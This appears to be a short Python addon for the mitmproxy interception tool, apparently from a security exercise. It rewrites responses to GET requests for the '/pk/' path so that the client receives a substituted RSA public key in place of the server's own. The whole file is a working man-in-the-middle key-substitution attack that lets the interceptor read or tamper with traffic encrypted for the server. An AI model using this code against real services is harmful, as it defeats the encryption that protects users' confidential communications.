import json
from mitmproxy import http
# from Crypto.PublicKey import RSA


def response(flow: http.HTTPFlow) -> None:
    """Intercepts responses from the server"""
    # replace the server's public key with our own
    if flow.request.path == '/pk/' and flow.request.method == 'GET':
        flow.response = http.Response.make(
            200,
            '-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv6ueWLuInT6pyvSPYq1NQTplAunIr9CXTeq8kqR3nSOBuXaRo7JAP1RAvQkVvLl4WzukMECPiBTvxQ1ODQTpP4yyVLG/wn6UUBATwwjhIuWhwjiZO5a42QcLnqnHJ4CjNZmhJ+NetoJfdgmxLZXveDjClqSGwOHieqnVtPWjYDfuGiFlkJZUiQEUc+rGGgHVJEGZFeVy1bD+V6J+Le7PglAPwDTzsdma6ys69YIfM7MiVbUcI6EJ0CIzHUkRYk080NS+Zatu+BQ5x2vE+FVwwNVdidKBi8Q/TEPFusFk/8bMPR8jKDl+zNiI9PFfaoBCoxNLOqIrdRzDDlf04vkKuQIDAQAB-----END PUBLIC KEY-----',
            {'content-type': 'text/plain'},
        )
